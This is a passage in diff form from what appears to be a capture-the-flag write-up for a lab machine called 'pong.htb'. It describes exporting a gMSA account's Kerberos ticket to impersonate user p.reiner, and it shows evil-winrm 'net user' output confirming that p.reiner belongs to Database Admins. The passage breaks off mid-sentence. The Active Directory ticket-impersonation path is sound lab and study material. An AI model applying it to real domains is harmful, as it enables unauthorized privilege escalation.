@@ -832,4 +832,37 @@ Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
 [*] Saving ticket in p.reiner@mssqlsvc_dc2.pong.htb@PONG.HTB.ccache
 ```
 
-Then after making sure to export the pong gmsa account TGT i can request a ticket for the 
+Then after making sure to export the pong gmsa account TGT i can request a ticket for the `p.reiner` user, this user is in the database admins group
+
+```python
+evil-winrm-py PS C:\Users\C.Carlssen\Desktop> net user p.reiner
+User name                    P.Reiner
+Full Name                    
+Comment                      
+User's comment               
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            1/16/2026 6:20:41 AM
+Password expires             Never
+Password changeable          1/17/2026 6:20:41 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script                 
+User profile                 
+Home directory               
+Last logon                   Never
+
+Logon hours allowed          All
+
+Local Group Memberships      
+Global Group memberships     *Domain Users         *Database Admins      
+The command completed successfully.
+
+evil-winrm-py PS C:\Users\C.Carlssen\Desktop>
+```
+
+As shows here the user is in the database admins group, making him a good target, since he will be able to execute c
